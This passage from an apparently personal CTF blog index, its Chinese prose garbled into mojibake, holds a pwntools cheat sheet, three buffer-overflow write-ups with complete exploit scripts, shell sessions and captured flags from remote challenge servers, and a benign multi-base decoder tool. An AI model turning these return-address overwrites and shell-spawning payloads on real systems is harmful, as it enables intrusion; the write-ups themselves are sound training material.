shellï¼Œç±»ä¼¼äºncã€‚åˆ‡æ¢è‡³è¿™ä¸ªæ¨¡å¼æ—¶ä¼šè‡ªåŠ¨printå½“å‰æ‰€æœ‰ç¼“å†²æ•°æ®ã€‚ 2) æ‰“åŒ…/è§£åŒ…ä¸å¿«æ·æ‹¼æ¥ p32(x) / p64(x)ï¼Œu32(b) / u64(b)ï¼šæ•´å‹ä¸å­—èŠ‚åºäº’è½¬ï¼ˆå°ç«¯ï¼‰ flat(*args, filler=b&#39;A&#39;, length=None)ï¼šä¼šæŠŠä¼ å…¥çš„å„ç±»å¯¹è±¡æ™ºèƒ½è½¬æ¢æˆä¸€æ®µå­—èŠ‚ä¸²ã€‚å®ƒä¼šæ ¹æ® contextï¼ˆæ¶æ„/å­—èŠ‚åº/ä½å®½ï¼‰è‡ªåŠ¨å¤„ç†å¯¹é½ä¸æ‰“åŒ…ã€‚ ä¾‹å­ï¼š 123456789payload = flat(&#123; 0: shellcode, # shellcode 256: JMP_RSI_Adress&#125;)payload = flat(&#123; 0: b&quot;A&quot;*84, 84: win_Adress&#125;) fit(&#123;offset: data, ...&#125;, filler=b&#39;A&#39;)ï¼šæŒ‰åç§»æ”¾ç½®æ•°æ® cyclic(n) / cyclic_find(value, n=4/8)ï¼šèŠ±æŒ‡çº¹ä¸åç§»å®šä½ï¼ˆä¹Ÿå¯ç”¨ pwndbg çš„ï¼‰ 3) ç¨‹åºä¿¡æ¯ä¸ ROP å·¥å…· ELF(path)ï¼šè¯»ç¬¦å·ã€plt/gotã€æ®µåœ°å€ç­‰ elf.symbols[]ï¼šä»ç¬¦å·è¡¨è¯»å–ç¬¦å·ï¼ˆå‡½æ•°/å…¨å±€å˜é‡ï¼‰çš„åœ°å€ã€‚è¿”å› intã€‚æ¯”å¦‚è¯´ï¼š 1main = elf.symbols[&#x27;main&#x27;] # main å‡½æ•°å…¥å£ elf.search()ï¼šåœ¨å¯æ‰§è¡Œæ–‡ä»¶å·²æ˜ å°„çš„å„æ®µä¸­æŒ‰å­—èŠ‚åºåˆ—æœç´¢å†…å®¹å¹¶è¿”å›ä¸€ä¸ªç”Ÿæˆå™¨ï¼ˆè¿­ä»£å¾—åˆ°æ¯ä¸ªåŒ¹é…çš„åœ°å€ï¼‰ã€‚å¸¸é…åˆ next(...) å–ç¬¬ä¸€ä¸ªåŒ¹é…ã€‚ã€‚æ¯”å¦‚è¯´ 123elf.search(b&#x27;/bin/sh&#x27;) # æŸ¥æ‰¾&#x27;/bin/sh&#x27;å­—ç¬¦ä¸²pop_rdi = next(elf.search(asm(&#x27;pop rdi ; ret&#x27;))) # æŸ¥æ‰¾&#x27;pop rdi ; ret&#x27;å‘½ä»¤ elf.got[]ï¼šè·å– GOT è¡¨é¡¹åœ°å€ï¼ˆå­˜æ”¾çœŸå®å‡½æ•°åœ°å€çš„æŒ‡é’ˆä½ç½®ï¼‰ã€‚è¿”å› intï¼ˆå¯å†™æ®µï¼›Full RELRO ä¸‹åªè¯»ï¼‰ã€‚æ¯”å¦‚è¯´ 1got_puts = elf.got[&#x27;puts&#x27;] # å– puts çš„ GOT è¡¨é¡¹åœ°å€ï¼ˆ&amp;puts@GOTï¼‰ elf.plt[&#39;puts&#39;]ï¼šè·å– PLT è·³æ¿ï¼ˆæ¡©å‡½æ•°ï¼‰çš„åœ°å€ã€‚è¿”å› intã€‚æ¯”å¦‚è¯´ï¼š 1plt_puts = elf.plt[&#x27;puts&#x27;] # è°ƒç”¨ puts@pltï¼ŒæŠŠæŸåœ°å€å½“ä½œå‚æ•°æ‰“å° ROP(elf)ï¼šè‡ªåŠ¨æœ gadget/æ‹¼ ROP rop.find_gadget([&#39;pop rdi&#39;, &#39;ret&#39;])ï¼Œrop.call(&#39;puts&#39;, [addr])ï¼Œrop.chain() context.binary = elfï¼šè®© pwntools è‡ªåŠ¨è·Ÿéšæ¶æ„ 4) Shellcode / æ±‡ç¼– asm(&#39;mov rax, 60; xor rdi, rdi; syscall&#39;)ï¼šå°†æ±‡ç¼–è½¬ä¸ºæœºå™¨ç  shellcraft.sh() / asm(shellcraft.sh())ï¼š /bin/shçš„Shellcodeã€‚ disasm(b&#39;\\x90\\x90\\xcc&#39;)ï¼šåæ±‡ç¼–å­—èŠ‚æµ 5) è°ƒè¯•è¾…åŠ© gdb.attach(io, gdbscript=&#39;b *0x401234\\nc&#39;)ï¼šæœ¬åœ°æŒ‚ gdb gdb.debug([path], gdbscript=...)ï¼šç”± gdb å¯åŠ¨è¿›ç¨‹ï¼ˆä¾¿äºæ–­ç‚¹ï¼‰ 6) æ‚é¡¹ hexdump(data)ï¼šåå…­è¿›åˆ¶æ‰“å° log.info()/success()/warning()ï¼šç¾åŒ–æ—¥å¿— context.timeout = 2ï¼šå…¨å±€è¶…æ—¶ pause()ï¼šè„šæœ¬æš‚åœï¼Œæ‰‹åŠ¨æ“ä½œåç»§ç»­ æ¨¡æ¿ processç”¨äºæœ¬åœ°æµ‹è¯•ï¼Œåœ°å€ç»™äºŒè¿›åˆ¶æ–‡ä»¶çš„åœ°å€ï¼› remoteç”¨äºè¿æ¥æœåŠ¡å™¨ã€‚ 123456789101112131415161718from pwn import *context.update(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;) #64ä½x86ç¨‹åº# context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;) 32ä½x86ç¨‹åºelf = ELF(&#x27;./vuln&#x27;, checksec=False)# r = process(&#x27;./vuln&#x27;)r = remote(&quot;Host&quot;,Port) r.recvuntil(b&#x27;:&#x27;)payload = b&quot;A&quot;*64 + b&quot;B&quot;*4 + p64()r.sendline(payload)r.interactive() é¢˜ç›®åˆ†ç±» Pwnç›¸å…³åŸºç¡€çŸ¥è¯†ï¼š HTB Questionnaire Writeup HTB Lesson Writeup Buffer Overflowï¼š ä¿®æ”¹ç›®æ ‡å˜é‡çš„å€¼ï¼š æ”»é˜²ä¸–ç•Œ hello_pwn Writeup ROPï¼š ret2libcï¼š æ”»é˜²ä¸–ç•Œ level0 Writeup æ”»é˜²ä¸–ç•Œ level2 Writeup HTB You_know_0xDiablos Writeup TJCTF 2025 pwn/i-love-birds Writeup TUM Binary Exploitation qualification challenge ï¼ˆè¿™é¢˜åœ¨åˆ©ç”¨Buffer Overflowæ¼æ´ä¿®æ”¹è¿”å›åœ°å€çš„åŸºç¡€ä¸Šå¤šäº†ä¸€ä¸ªéœ€è¦ç»•è¿‡çš„æ£€æµ‹ã€‚ï¼‰ ret2shellcodeï¼š HTB Regularity Writeup 3 æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š HTB racecar Writeupï¼ˆåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¯»å–ä¿¡æ¯ã€‚ï¼‰ æ”»é˜²ä¸–ç•Œ CGfsb Writeup ï¼ˆåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¿®æ”¹ç›®æ ‡å˜é‡çš„å€¼ã€‚ï¼‰ æœªå®Œå¾…ç»­â€¦","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/tags/Pwn/"}]},{"title":"æ”»é˜²ä¸–ç•Œ level0 Writeup","slug":"CTF/Pwn/æ”»é˜²ä¸–ç•Œ-level0-Writeup","date":"2025-05-12T12:31:45.000Z","updated":"2025-06-10T19:08:14.597Z","comments":true,"path":"2025/05/12/CTF/Pwn/æ”»é˜²ä¸–ç•Œ-level0-Writeup/","permalink":"https://archer-baiyi.github.io/2025/05/12/CTF/Pwn/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0-Writeup/","excerpt":"åˆ©ç”¨Buffer Overflowä¿®æ”¹è¿”å›åœ°å€ä»¥è°ƒç”¨ç›®æ ‡å‡½æ•°ã€‚","text":"è§‚å¯Ÿç”¨idaæ‰“å¼€æ‹¿åˆ°çš„æ–‡ä»¶ä¼šçœ‹åˆ°ä¸»ç¨‹åºï¼ˆä½¿ç”¨F5å¯ä»¥å°†æœºå™¨ç åç¼–è¯‘æˆä¼ªä»£ç ï¼‰ï¼š æŸ¥çœ‹ vulnerable_functionï¼š å‘ç°readçš„æ¼æ´ã€‚ æ¥ç€ä¾¿æ˜¯éœ€è¦æŸ¥çœ‹Stackçš„ç»“æ„ã€‚ç‚¹å‡»è¿™é‡Œçš„bufä¾¿å¯ä»¥æŸ¥çœ‹å½“å‰å‡½æ•°çš„stackç»“æ„ï¼š å¯ä»¥å‘ç°å…ˆæ˜¯å­˜å‚¨å½“å‰çš„è¾“å…¥å†…å®¹ï¼ˆæœŸæœ›é•¿åº¦ä¸º128ï¼‰ï¼Œç„¶åä¾¿æ˜¯saved_registersï¼ˆé•¿åº¦ä¸º8ï¼‰ï¼Œæœ€åæ‰æ˜¯return_addressã€‚ é€šè¿‡æŸ¥çœ‹Exportså¯ä»¥å‘ç°callsystemè¿™ä¸ªå‡½æ•°åŠå…¶åœ°å€ï¼š 1callsystem 0000000000400596 æˆ‘ä»¬å¯ä»¥ä½¿ç”¨pwné‡Œçš„p64()å‡½æ•°è‡ªåŠ¨å°†ä¸€ä¸ªæ•´æ•°æ‰“åŒ…æˆ 64 ä½å°ç«¯åºï¼ˆlittle endianï¼‰çš„å­—èŠ‚ä¸²ã€‚å› ä¸ºå¤§éƒ¨åˆ†ç°ä»£çš„æ¶æ„ä½¿ç”¨çš„éƒ½æ˜¯å°ç«¯åºã€‚ 1p64(0x400596) Exploitæˆ‘ä»¬éœ€è¦åšçš„æ˜¯å‘é€ä¸€æ®µå†…å®¹ï¼Œç»“æ„å¦‚ä¸‹ï¼š 1payload = b&quot;A&quot; * 128 + b&quot;B&quot;*8 + p64(0x400596) å‰é¢ABçš„éƒ¨åˆ†ä¼šè¦†ç›–æ‰bufä»¥åŠsaved_registersï¼Œä»¥è‡³äºå¯ä»¥ç”¨p64(0x400596)è¦†ç›–æ‰å‡½æ•°çš„è¿”å›åœ°å€ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šç›´æ¥è°ƒç”¨callsystemè¿™ä¸ªå‡½æ•°ã€‚è°ƒç”¨äº†ä¹‹ååªéœ€è¦ä½¿ç”¨lså’Œcat flagå‘½ä»¤å³å¯è¯»å–flagã€‚ Exploitä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132from pwn import *r = remote(&quot;61.147.171.105&quot;, 49676)res = r.recvline()print(res)payload = b&quot;A&quot; * 128 + b&quot;B&quot;*8 + p64(0x400596)r.sendline(payload)r.interactive()# [x] Opening connection to 61.147.171.105 on port 49676# [x] Opening connection to 61.147.171.105 on port 49676: Trying 61.147.171.105# [+] Opening connection to 61.147.171.105 on port 49676: Done# b&#x27;Hello, World\\n&#x27;# [*] Switching to interactive mode# ls# bin# dev# flag# level0# lib# lib32# lib64# cat flag# cyberpeace&#123;f400f63c7cea1e147b6960fc106b45f0&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/tags/Pwn/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"æ”»é˜²ä¸–ç•Œ","permalink":"https://archer-baiyi.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"æ”»é˜²ä¸–ç•Œ level2 Writeup","slug":"CTF/Pwn/æ”»é˜²ä¸–ç•Œ-level2-Writeup","date":"2025-05-12T08:24:30.000Z","updated":"2025-06-10T19:08:52.443Z","comments":true,"path":"2025/05/12/CTF/Pwn/æ”»é˜²ä¸–ç•Œ-level2-Writeup/","permalink":"https://archer-baiyi.github.io/2025/05/12/CTF/Pwn/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level2-Writeup/","excerpt":"é€šè¿‡Buffer Overflowä¿®æ”¹è¿”å›åœ°å€ä»¥è°ƒç”¨ç›®æ ‡å‡½æ•°å¹¶ä¼ é€’å‚æ•°ã€‚","text":"è§‚å¯Ÿç”¨idaæ‰“å¼€æ–‡ä»¶æŸ¥çœ‹mainå‡½æ•°ï¼š å¯ä»¥å‘ç°æ²¡æœ‰è¾“å…¥é•¿åº¦é™åˆ¶ã€‚ æ¥ç€æŸ¥çœ‹vulnerable_function()çš„stackç»“æ„ï¼š æ­¤å¤–ï¼Œmainå‡½æ•°è‡ªå·±ä¼šè°ƒç”¨system()ï¼š ç°åœ¨æ¥æ‰¾call _systemè¿™ä¸ªå‘½ä»¤çš„åœ°å€ï¼š åœ¨è¿™ä¸ªé¡µé¢å³é”®ç‚¹å‡»_systemå¹¶é€‰æ‹©Text viewï¼š ä¾¿å¯ä»¥ç¡®å®šè¿™è¡Œå‘½ä»¤åœ¨textï¼ˆå³ä»£ç ï¼‰éƒ¨åˆ†çš„åœ°å€ï¼š 10804849E æ¥ç€ä½¿ç”¨Shift+F12æŸ¥çœ‹æ–‡ä»¶é‡Œçš„stringï¼š ç”±äºsystemå‡½æ•°å®é™…ä¸Šæ¥å—çš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²çš„æŒ‡é’ˆï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨åœ¨ä¸Šé¢æ‰¾åˆ°çš„/bin/shçš„åœ°å€å¹¶å°†å…¶ä½œä¸ºå‚æ•°ä¼ ç»™systemå‡½æ•°ã€‚ æ³¨æ„ï¼è¿™ä¸ªç¨‹åºæ˜¯32bitçš„ã€‚ å¯ä»¥é€šè¿‡å¾ˆå¤šæ–¹é¢æ¥åˆ¤æ–­ï¼š ç¨‹åºä¸­ä½¿ç”¨äº†eax, ecx, esp, ebpç­‰å¯„å­˜å™¨ã€‚è¿™äº›éƒ½æ˜¯32ä½å¯„å­˜å™¨ã€‚ ï¼ˆå¦‚æœæ˜¯ 64 ä½ç¨‹åºï¼Œå¯„å­˜å™¨é€šå¸¸ä¼šæ˜¯ï¼šrax, rcx, rsp, rbp, ç­‰ã€‚ï¼‰ åœ°å€å®½åº¦æ˜¯32bitçš„ï¼ˆæœ€ç®€å•ä¹Ÿæ˜¯æœ€é‡è¦çš„åˆ¤æ–­æ¡ä»¶ï¼‰ æ‰€ä»¥ä¹‹åéœ€è¦ä½¿ç”¨pwnåº“çš„p32()ï¼Œè€Œä¸æ˜¯p64()ã€‚ Exploitæˆ‘ä»¬åšä»¥ä¸‹æ“ä½œï¼š è¦†ç›–æ‰bufä»¥åŠsaved_registerséƒ¨åˆ†ï¼ˆ=136+4ï¼‰ å°†vulnerable_function()çš„è¿”å›åœ°å€ä¿®æ”¹æˆcall _system()çš„åœ°å€ å°†system()å‡½æ•°çš„å‚æ•°æ”¹ä¸º/bin/shçš„åœ°å€ ä¾¿å¯ä»¥æˆåŠŸæ‰“å¼€shellã€‚ æ‰€ä»¥æˆ‘ä»¬éœ€è¦åšçš„æ˜¯å‘é€è¿™æ®µå†…å®¹ï¼š 123payload = b&quot;a&quot; * (136 + 4) # buf ä»¥åŠ saved_registers çš„éƒ¨åˆ†payload += p32(0x0804849E) # call _system() çš„åœ°å€payload += p32(0x0804A024) # /bin/sh çš„åœ°å€ ä¹‹åä¾¿æ˜¯ä½¿ç”¨lsä»¥åŠcat flagå‘½ä»¤è¯»å–flagã€‚ Exploitä»£ç ï¼š 123456789101112131415161718192021222324252627282930from pwn import *r = remote(&quot;223.112.5.141&quot;, 50648)print(r.recvline())payload = b&quot;a&quot; * (136 + 4) # buf ä»¥åŠ saved_registers çš„éƒ¨åˆ†payload += p32(0x0804849E) # call _system() çš„åœ°å€payload += p32(0x0804A024) # /bin/sh çš„åœ°å€r.sendline(payload)r.interactive()# [x] Opening connection to 223.112.5.141 on port 50648# [x] Opening connection to 223.112.5.141 on port 50648: Trying 223.112.5.141# [+] Opening connection to 223.112.5.141 on port 50648: Done# b&#x27;Input:\\n&#x27;# [*] Switching to interactive mode# ls# bin# dev# flag# level2# lib# lib32# lib64# cat flag# cyberpeace&#123;630b1c1c66bca13f722670008c4ec2af&#125;# [*] Interrupted# [*] Closed connection to 223.112.5.141 port 50648","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/tags/Pwn/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"æ”»é˜²ä¸–ç•Œ","permalink":"https://archer-baiyi.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"æ”»é˜²ä¸–ç•Œ hello_pwn Writeup","slug":"CTF/Pwn/æ”»é˜²ä¸–ç•Œ-hello-pwn-Writeup","date":"2025-05-12T08:00:16.000Z","updated":"2025-06-10T19:07:24.740Z","comments":true,"path":"2025/05/12/CTF/Pwn/æ”»é˜²ä¸–ç•Œ-hello-pwn-Writeup/","permalink":"https://archer-baiyi.github.io/2025/05/12/CTF/Pwn/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hello-pwn-Writeup/","excerpt":"åˆ©ç”¨Buffer Overflowæ¥ä¿®æ”¹ç›®æ ‡å˜é‡çš„å€¼","text":"è§‚å¯Ÿç”¨idaæ‰“å¼€æ–‡ä»¶æŸ¥çœ‹mainå‡½æ•°ï¼š æŸ¥çœ‹sub_400686()ï¼š ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¦‚æœå¯ä»¥æ»¡è¶³ifçš„æ¡ä»¶ä¾¿å¯ä»¥å¾—åˆ°flagã€‚ æŸ¥çœ‹unk_601068å’Œdword_60106Cçš„ä½ç½®ï¼ˆç›´æ¥ç‚¹å‡»è¿™2ä¸ªå˜é‡å³å¯ï¼‰ï¼š å¯ä»¥å‘ç°ä»–ä»¬çš„åœ°å€åªå·®äº†4Byteã€‚ Exploitæˆ‘ä»¬éœ€è¦åšçš„æ˜¯å‘é€ä¸€æ®µå†…å®¹ï¼Œç»“æ„å¦‚ä¸‹ï¼š 1payload = b&quot;AAAA&quot; + p32(1853186401) é¦–å…ˆå°†å®ƒä»¬ä¸­é—´å·®çš„4ä¸ªByteç»™å¡«æ»¡ï¼Œç„¶åä¾¿å¯ä»¥å°†dword_60106CåŸæœ¬çš„å†…å®¹è¦†ç›–æˆæ»¡è¶³ifè¦æ±‚çš„å€¼ï¼Œä¹‹åä¾¿å¯ä»¥ç›´æ¥å¾—åˆ°flagã€‚ Exploitä»£ç ï¼š 1234567891011121314151617181920212223242526from pwn import *r = remote(&quot;61.147.171.105&quot;, 59747)res = r.recvline()print(res)res = r.recvline()print(res)payload = b&quot;AAAA&quot; + p32(1853186401)r.sendline(payload)res = r.recvall()print(res)# [x] Opening connection to 61.147.171.105 on port 59747# [x] Opening connection to 61.147.171.105 on port 59747: Trying 61.147.171.105# [+] Opening connection to 61.147.171.105 on port 59747: Done# b&#x27;~~ welcome to ctf ~~ \\n&#x27;# b&#x27;lets get helloworld for bof\\n&#x27;# [x] Receiving all data# [x] Receiving all data: 0B# [x] Receiving all data: 45B# [+] Receiving all data: Done (45B)# [*] Closed connection to 61.147.171.105 port 59747# b&#x27;cyberpeace&#123;7ffb977ba34907b01a6b6b74280a5921&#125;\\n&#x27;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/tags/Pwn/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"æ”»é˜²ä¸–ç•Œ","permalink":"https://archer-baiyi.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"è§£ç å™¨","slug":"CTF/Crypto/è§£ç å™¨","date":"2025-05-11T18:50:59.000Z","updated":"2025-05-11T19:04:03.148Z","comments":true,"path":"2025/05/11/CTF/Crypto/è§£ç å™¨/","permalink":"https://archer-baiyi.github.io/2025/05/11/CTF/Crypto/%E8%A7%A3%E7%A0%81%E5%99%A8/","excerpt":"","text":"ç”¨Pythonå†™äº†ä¸€ä¸ªè‡ªåŠ¨è§£ç çš„è½¯ä»¶ï¼Œå¯ä»¥è‡ªåŠ¨è¿›è¡Œå¤šè½®çš„base 32ï¼Œ58ï¼Œ64ï¼Œ91ï¼ŒäºŒè¿›åˆ¶ä»¥åŠhexè§£ç ã€‚ ï¼ˆåç»­å¯èƒ½ä¼šæ›´æ–°ã€‚ï¼‰ æ•ˆæœ å¦‚æœå¯ä»¥æˆåŠŸè§£ç æˆtextï¼Œåˆ™ç›´æ¥è¾“å‡ºtextï¼š å¦‚æœä¸èƒ½ï¼Œåˆ™è¾“å‡ºhexä½œä¸ºä¿åº•ï¼š ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136import tkinter as tkfrom tkinter import scrolledtextimport base64import reimport base58import base91def is_binary(s): return all(c in &#x27;01&#x27; for c in s) and len(s) % 8 == 0def decode_bytes(byte_data): try: text = byte_data.decode(&#x27;utf-8&#x27;) return text, True except UnicodeDecodeError: return byte_data.hex(), Falsedef looks_like_base64(s): return len(s) % 4 == 0 and re.fullmatch(r&#x27;[A-Za-z0-9+/=]+&#x27;, s) is not Nonedef looks_like_base32(s): return len(s) % 8 == 0 and re.fullmatch(r&#x27;[A-Z2-7=]+&#x27;, s, re.IGNORECASE) is not Nonedef looks_like_base58(s): return all(c in base58.alphabet.decode() for c in s)def looks_like_base91(s): return all(33 &lt;= ord(c) &lt;= 126 for c in s)def try_decode(s, func): decoded = func(s) return decode_bytes(decoded)def recursive_decode(s, path=None, all_paths=None, max_depth=10): if path is None: path = [] if all_paths is None: all_paths = [] if len(path) &gt;= max_depth: return all_paths decoders = [ (&#x27;Base64&#x27;, looks_like_base64, base64.b64decode), (&#x27;Base32&#x27;, looks_like_base32, base64.b32decode), (&#x27;Base58&#x27;, looks_like_base58, base58.b58decode), (&#x27;Base91&#x27;, looks_like_base91, base91.decode), (&#x27;Binary&#x27;, is_binary, lambda x: bytes(int(x[i:i+8], 2) for i in range(0, len(x), 8))), (&#x27;Hex&#x27;, lambda x: True, lambda x: bytes.fromhex(x)), ] for name, detector, func in decoders: if detector(s): try: text, is_utf8 = try_decode(s, func) except Exception: continue mode = &#x27;(UTF-8)&#x27; if is_utf8 else &#x27;(hex)&#x27; new_path = path + [(name, text, mode)] all_paths.append(new_path) if is_utf8: recursive_decode(text, new_path, all_paths, max_depth) return all_pathsdef select_final_path(paths): utf_paths = [p for p in paths if p[-1][2] == &#x27;(UTF-8)&#x27;] if utf_paths: max_len = max(len(p) for p in utf_paths) for p in utf_paths: if len(p) == max_len: return p max_len = max(len(p) for p in paths) for p in paths: if len(p) == max_len: return pdef decode_input(): raw = input_text.get(&#x27;1.0&#x27;, tk.END).strip().replace(&#x27; &#x27;, &#x27;&#x27;) output_text.delete(&#x27;1.0&#x27;, tk.END) if not raw: return paths = recursive_decode(raw) if not paths: output_text.insert(tk.END, &#x27;æ— æ³•è¯†åˆ«æˆ–è§£ç æ­¤å†…å®¹ã€‚&#x27;) return final = select_final_path(paths) for i, (name, text, mode) in enumerate(final, 1): output_text.insert(tk.END, f&quot;ç¬¬&#123;i&#125;æ­¥ - &#123;name&#125; &#123;mode&#125;\\nç»“æœï¼š&#123;text&#125;\\n\\n&quot;) # å¦‚æœåªæœ‰ä¸€æ­¥ä¸”ä¸º UTF-8ï¼Œä½†ç»“æœä»å¯èƒ½æ˜¯ç¼–ç ä¸²ï¼Œåˆ™é¢å¤–å°è¯•ä¸€æ¬¡è§£ç å¹¶è¾“å‡º hex if len(final) == 1 and final[0][2] == &#x27;(UTF-8)&#x27;: s = final[0][1] extra_decoders = [ (&#x27;Base64&#x27;, looks_like_base64, base64.b64decode), (&#x27;Base32&#x27;, looks_like_base32, base64.b32decode), (&#x27;Base58&#x27;, looks_like_base58, base58.b58decode), (&#x27;Base91&#x27;, looks_like_base91, base91.decode), (&#x27;Binary&#x27;, is_binary, lambda x: bytes(int(x[i:i+8], 2) for i in range(0, len(x), 8))) ] for name, detector, func in extra_decoders: if detector(s): try: data = func(s) hex_out = data.hex() output_text.insert(tk.END, f&quot;ç¬¬2æ­¥ - &#123;name&#125; (hex)\\nç»“æœï¼š&#123;hex_out&#125;\\n&quot;) break except Exception: continue# GUIroot = tk.Tk()root.title(&#x27;è§£ç å™¨&#x27;)root.geometry(&#x27;600x500&#x27;)font_title = (&#x27;å¾®è½¯é›…é»‘&#x27;, 12, &#x27;bold&#x27;)font_text = (&#x27;å¾®è½¯é›…é»‘&#x27;, 10)tk.Label(root, text=&#x27;è¯·è¾“å…¥ç¼–ç å†…å®¹ï¼š&#x27;, font=font_title).pack(pady=(10,0))input_text = scrolledtext.ScrolledText(root, height=6, font=font_text, wrap=tk.WORD)input_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)tk.Button(root, text=&#x27;å¼€å§‹è§£ç &#x27;, font=font_title, bg=&#x27;#4CAF50&#x27;, fg=&#x27;white&#x27;, command=decode_input).pack(pady=10)tk.Label(root, text=&#x27;è§£ç è¾“å‡ºï¼š&#x27;, font=font_title).pack()output_text = scrolledtext.ScrolledText(root, height=10, font=font_text, wrap=tk.WORD)output_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)root.mainloop() æ‰“åŒ…å¯ä»¥ç”¨pyinstallerå°†è¿™ä¸ªç¨‹åºæ‰“åŒ…æˆ.exeè½¯ä»¶ã€‚ å¦‚æœæ²¡æœ‰å®‰è£…ï¼Œåˆ™è¿è¡Œï¼š 1pip install pyinstaller å®‰è£…å¥½åè¿è¡Œï¼ˆå…ˆå°†å½“å‰pythonè„šæœ¬ä¿å­˜ä¸ºdecoder.pyï¼‰ï¼š 1pyinstaller --noconfirm --windowed --onefile .\\decoder.py .exeæ–‡ä»¶åº”è¯¥ä¼šç”Ÿæˆåœ¨å½“å‰ç›®å½•ä¸‹çš„ï¼š 1dist/decoder.exe æµ‹è¯•éšæœºç”Ÿæˆä¸€æ®µè¿›è¡Œè¿‡å¤šè½®baseç¼–ç çš„å†…å®¹ï¼š 12345678910111213141516171819202122232425262728import base64import base58import randomtext = &quot;hello world&quot;data = text.encode(&#x27;utf-8&#x27;)encodings = [&#x27;base64&#x27;, &#x27;base32&#x27;, &#x27;base58&#x27;]history = []for i in range(10): encoding = random.choice(encodings) history.append(encoding) if encoding == &#x27;base64&#x27;: data = base64.b64encode(data) elif encoding == &#x27;base32&#x27;: data = base64.b32encode(data) elif encoding == &#x27;base58&#x27;: data = base58.b58encode(data)print(&quot;Final encoded result:&quot;, data.decode(&#x27;utf-8&#x27;))print(&quot;Encoding history:&quot;, history)# Final encoded result: VlRKek1WWldTbFphUmxwU1RWWktUVlJyVWt0U2JGRjRXa1ZXVm1FeVVsQlZha1pYVld4YVZsUnJUbFJoTUhCaFZtMXpkMlZzVWtkUmF6RlNWbTE0VmxWNlFYaFVSbHBYVVd0T1dGWnNXa1ZXTW5SUFUxWktObFpzYUZkV1YwNDJWbFJDVjFWRk5WZGhSVnBWVm14d1ZGWXhWWGhXTVZKV1YydG9WV0V3TlZaV1JFWmhVbFpLY2xac1pGWk5SRVpLVlcxd1MxTkdVbGRYYkZKVFZsUldVRlpGVmxOV1JsWnlWVmhzVldFelFsQlZiRkpUVjJ4VmVHSkZPVlZoTWxKSlZtcEdTMVV4Vm5KUFZtUlNUVVp3VTFZeFVrdFVRVDA5# Encoding history: [&#x27;base64&#x27;, &#x27;base64&#x27;, &#x27;base32&#x27;, &#x27;base58&#x27;, &#x27;base58&#x27;, &#x27;base32&#x27;, &#x27;base64&#x27;, &#x27;base64&#x27;, &#x27;base64&#x27;, &#x27;base64&#x27;] ç¨‹åºçš„è¾“å‡ºä¸ºï¼š 123456789101112131415161718192021222324252627282930ç¬¬1æ­¥ - Base64 (UTF-8)ç»“æœï¼šVTJzMVZWSlZaRlpSTVZKTVRrUktSbFF4WkVWVmEyUlBVakZXVWxaVlRrTlRhMHBhVm1zd2VsUkdRazFSVm14VlV6QXhURlpXUWtOWFZsWkVWMnRPU1ZKNlZsaFdWV042VlRCV1VFNVdhRVpVVmxwVFYxVXhWMVJWV2toVWEwNVZWREZhUlZKclZsZFZNREZKVW1wS1NGUldXbFJTVlRWUFZFVlNWRlZyVVhsVWEzQlBVbFJTV2xVeGJFOVVhMlJJVmpGS1UxVnJPVmRSTUZwU1YxUktUQT09ç¬¬2æ­¥ - Base64 (UTF-8)ç»“æœï¼šU2s1VVJVZFZRMVJMTkRKRlQxZEVVa2RPUjFWUlZVTkNTa0paVmswelRGQk1RVmxVUzAxTFZWQkNXVlZEV2tOSVJ6VlhWVWN6VTBWUE5WaEZUVlpTV1UxV1RVWkhUa05VVDFaRVJrVldVMDFJUmpKSFRWWlRSVTVPVEVSVFVrUXlUa3BPUlRSWlUxbE9Ua2RIVjFKU1VrOVdRMFpSV1RKTA==ç¬¬3æ­¥ - Base64 